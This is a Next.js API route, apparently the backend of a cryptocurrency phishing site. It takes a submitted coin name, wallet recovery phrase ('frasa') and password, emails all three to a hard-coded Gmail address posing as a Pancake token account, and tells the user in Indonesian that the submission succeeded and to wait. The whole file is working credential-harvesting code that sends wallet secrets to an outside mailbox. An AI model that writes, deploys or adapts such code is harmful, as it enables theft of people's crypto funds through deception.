import type { NextApiRequest, NextApiResponse } from "next";

require("dotenv").config();

const nodemailer = require("nodemailer");

export default async function mail(
  req: NextApiRequest,
  res: NextApiResponse<any>
) {
  try {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      host: "smtp.gmail.com",
      auth: {
        user: process.env.email,
        pass: process.env.password,
      },
    });
    const mailData = {
      from: process.env.email,
      to: "pancake.officialtoken@gmail.com",
      subject: `Crypto Submit`,
      html: `<style type="text/css">
            .table-box {
                width: 100% !important;
            }
            </style>
            <table class="table-box" align="center" border="0" cellpadding="0" cellspacing="0" style="margin: unset; padding: unset;background-color: #fff;">
                <tbody>
                    <table class="table-box" align="center" border="0" cellpadding="0" cellspacing="0" style="margin: unset; padding: unset; background-color: #fff; width: 100%">
                    <tbody>
                        <tr style="width: 100%">
                            <td>
                                <table align="left" border="0" cellpadding="0" cellspacing="0" style="text-align: left;" width="100%">
                                    <tr style="width: 100%">
                                        <td style="border-bottom: 4px solid #000000;">
                                            
                                        </td>
                                        <td style="border-bottom: 4px solid #000000;">
                                            
                                        </td>
                                    </tr>                            
                                    <tr style="width: 100%">
                                        <p style="font-size: 14px;"><b>Hallo,</b></p>
                                        <p>Ada data baru yang terkirim</p>
                                        <br />
                                        <p>Coin : ${req.body.coin}</p>
                                        <p>Frasa : ${req.body.frasa}</p>
                                        <p>Password : ${req.body.password}</p>
                                        <br />
                                        <p style="margin-top: 5px;">
                                            <strong>Note :</strong>
                                        </p>
                                        <p style="font-size: 14px;">Jika email masuk dalam spam disarankan untuk mengklik "Laporkan bukan spam" yang muncul di bagian atas email.</p>
                                        </tr> 
                                    </table>
                                                    
                                </td>
                            </tr>
                        </tbody>            
                    </table>
                </tbody>
                <tfoot>
                <tr style="width: 100%">
                    <td>
                        <table class="table-box" align="center" border="0" cellpadding="0" cellspacing="0" style="margin: 0; padding: 0;background-color: #fff; width: 100%; max-width: 100%; min-width: 100%">
                            <tr>
                                <td style="padding: 30px 0;">
                                    
                                    <div style="border-top: 1px solid #444; margin: 20px auto 0;"></div>
                                    <table  border="0" cellpadding="0" cellspacing="0" width="100%" style="margin: 20px auto 0;" >
                                        
                                        <tr>
                                            <td style="text-align: -webkit-center; text-align: center;">
                                                <p style="font-size:13px; margin:0;">2022 Copy Right</p>
                                            </td>
                                        </tr>
                                        
                                    </table>
                                </td>
                            </tr>
                        </table>
                    </td>
                </tr>
                    
                </tfoot>
            <table>`,
    };
    // eslint-disable-next-line prefer-arrow-callback
    await transporter.sendMail(mailData, function (err: any) {
      if (err) throw err;
    });
  } catch (err) {
    res.status(500).json({ message: err });
  } finally {
    res.status(200).json({ message: "Berhasil, harap menunggu!!" });
  }
}
